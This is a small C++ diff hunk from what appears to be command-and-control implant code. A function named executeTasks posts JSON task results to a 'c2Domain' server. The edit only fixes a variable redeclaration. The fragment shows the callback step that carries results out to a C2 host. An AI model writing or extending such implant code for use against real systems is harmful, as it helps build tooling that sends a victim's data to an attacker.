@@ -238,7 +238,7 @@ void executeTasks(std::vector<json> tasks) {
 
             std::string jsonString = jsonResult.dump();
 
-            std::string response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);
+            response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);
 
             if (response == "Error") {
                 return;
